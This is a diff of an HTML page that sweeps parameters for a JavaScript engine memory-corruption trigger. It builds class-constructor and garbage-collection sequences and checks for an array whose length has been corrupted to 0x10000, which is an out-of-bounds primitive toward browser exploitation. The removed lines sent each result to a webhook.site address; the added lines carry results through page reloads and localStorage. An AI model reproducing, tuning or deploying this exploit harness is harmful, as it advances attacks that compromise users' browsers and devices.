@@ -1,80 +1,85 @@
 <!DOCTYPE html><html><body><h1>..</h1><script>
 
-function beacon(tag, data) {
-  try { new Image().src = "https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data||{})); } catch(e) {}
+function qparam(k) {
+  var m = new RegExp("[?&]" + k + "=([^&]*)").exec(location.search);
+  return m ? decodeURIComponent(m[1].replace(/\+/g, " ")) : null;
 }
-beacon("sweep2-loaded", {});
+var state = {i: 0, res: {}};
+try {
+  var saved = localStorage.getItem("sw3");
+  if (saved) { var p = JSON.parse(saved); if (p && typeof p.i == "number") state = p; }
+} catch(e) {}
+var urlResult = qparam("res");
+if (urlResult !== null) {
+  try {
+    var ur = JSON.parse(urlResult);
+    if (ur && typeof ur.i == "number" && ur.r !== undefined) { state.res["c" + ur.i] = ur.r; state.i = ur.i + 1; }
+  } catch(e) {}
+}
+try { localStorage.setItem("sw3", JSON.stringify(state)); } catch(e) {}
 
 var LOOPLENS = [400, 500, 650, 800, 1000, 1300];
 var GCS = [200, 800];
-
-function runConfig(loopLen, gcFrac, gcCount, variant) {
-  return new Function("loopLen","gcFrac","gcCount","variant", `
-    var dogc_flag = false;
-    var buffer = new ArrayBuffer(8);
-    var f64 = new Float64Array(buffer);
-    var u32 = new Uint32Array(buffer);
-    var empty_object = {}; var empty_array = [];
-    var corrupted_instance = null;
-    function dogc() {
-      if (dogc_flag == true) { for (var i = 0; i < gcCount; i++) { new ArrayBuffer(0x10000); } }
-    }
-    class ClassParent {}
-    class ClassBug extends ClassParent {
-      constructor() {
-        const v24 = new new.target();
-        var x = [empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object];
-        super();
-        if (variant == 2) { dogc(); }
-        var a = [1.1];
-        this.x = x; this.a = a;
-        this.d = dogc;
-        JSON.stringify(empty_array);
-      }
-      [1] = (variant == 1) ? dogc() : 0;
-    }
-    var hotAt = Math.floor(loopLen * gcFrac);
-    for (var i = 0; i < 200; i++) { dogc_flag = false; if (i%2==0) dogc_flag = true; dogc(); }
-    for (var i = 0; i < loopLen; i++) {
-      dogc_flag = false;
-      if (i >= hotAt && i < hotAt + 4) { dogc_flag = true; dogc(); dogc_flag = false; }
-      if (i == loopLen - 4) dogc_flag = true;
-      var x = Reflect.construct(ClassBug, empty_array, ClassParent);
-      if (i == Math.floor(loopLen*0.5)) corrupted_instance = x;
-    }
-    var x = corrupted_instance.x;
-    var a = corrupted_instance.a;
-    var corrupted = (a.length == 0x10000);
-    return corrupted;
-  `);
-}
-
-var done = {};
-try { done = JSON.parse(localStorage.getItem("sweep2") || "{}"); } catch(e) {}
 var cfgs = [];
 for (var L of LOOPLENS) for (var gf of [0.3,0.45,0.6,0.75,0.85,0.92]) for (var g of GCS) for (var v of [1,2]) {
-  var key = L+"_"+gf+"_"+g+"_v"+v;
-  if (!done[key]) cfgs.push({L:L, gf:gf, g:g, v:v, key:key});
+  cfgs.push({L:L, gf:gf, g:g, v:v});
 }
-beacon("sweep2-plan", {todo: cfgs.length});
-var idx = 0;
-function tryNext() {
-  if (idx >= cfgs.length) { beacon("sweep2-done", {all:true}); return; }
-  var c = cfgs[idx];
+
+var i = state.i;
+if (i >= cfgs.length) {
+  var corruptedKeys = [];
+  for (var k in state.res) { if (state.res[k] === true) corruptedKeys.push(k); }
+  try { localStorage.setItem("sw3done", JSON.stringify(corruptedKeys)); } catch(e) {}
+  document.title = "DONE " + corruptedKeys.join(",");
+  // stay: navigate to a done-marker URL (appears in device log)
+  setTimeout(function(){ location.href = location.pathname + "?done=" + corruptedKeys.length + "&keys=" + encodeURIComponent(corruptedKeys.join("|")); }, 1500);
+} else {
+  var c = cfgs[i];
+  var r = "err";
   try {
-    var f = runConfig(c.L, c.gf, c.g, c.v);
-    var r = f(c.L, c.gf, c.g, c.v);
-    done[c.key] = r;
-    beacon("sweep2-" + c.key, {corrupted: r});
-    if (r) { beacon("HIT2", {key: c.key}); localStorage.setItem("sweep2", JSON.stringify(done)); return; }
-  } catch(e) {
-    done[c.key] = "err";
-    beacon("sweep2-" + c.key + "-err", {e: String(e).slice(0,60)});
-  }
-  if (idx % 8 == 7) { try { localStorage.setItem("sweep2", JSON.stringify(done)); } catch(e) {} }
-  idx++;
-  setTimeout(tryNext, 200);
+    var f = new Function("loopLen","gcFrac","gcCount","variant", `
+      var dogc_flag = false;
+      var buffer = new ArrayBuffer(8);
+      var f64 = new Float64Array(buffer);
+      var u32 = new Uint32Array(buffer);
+      var empty_object = {}; var empty_array = [];
+      var corrupted_instance = null;
+      function dogc() {
+        if (dogc_flag == true) { for (var j = 0; j < gcCount; j++) { new ArrayBuffer(0x10000); } }
+      }
+      class ClassParent {}
+      class ClassBug extends ClassParent {
+        constructor() {
+          const v24 = new new.target();
+          var x = [empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object];
+          super();
+          if (variant == 2) { dogc(); }
+          var a = [1.1];
+          this.x = x; this.a = a;
+          this.d = dogc;
+          JSON.stringify(empty_array);
+        }
+        [1] = (variant == 1) ? dogc() : 0;
+      }
+      var hotAt = Math.floor(loopLen * gcFrac);
+      for (var j = 0; j < 200; j++) { dogc_flag = false; if (j%2==0) dogc_flag = true; dogc(); }
+      for (var j = 0; j < loopLen; j++) {
+        dogc_flag = false;
+        if (j >= hotAt && j < hotAt + 4) { dogc_flag = true; dogc(); dogc_flag = false; }
+        if (j == loopLen - 4) dogc_flag = true;
+        var x = Reflect.construct(ClassBug, empty_array, ClassParent);
+        if (j == Math.floor(loopLen*0.5)) corrupted_instance = x;
+      }
+      var x = corrupted_instance.x;
+      var a = corrupted_instance.a;
+      return (a.length == 0x10000);
+    `);
+    r = f(c.L, c.gf, c.g, c.v);
+  } catch(e) { r = "ex:" + String(e).slice(0,40); }
+  state.res["c" + i] = r;
+  try { localStorage.setItem("sw3", JSON.stringify(state)); } catch(e) {}
+  var next = location.pathname + "?r=s2&i=" + (i+1) + "&res=" + encodeURIComponent(JSON.stringify({i:i, r:r}));
+  setTimeout(function(){ location.href = next; }, 150);
 }
-tryNext();
 
 </script></body></html>
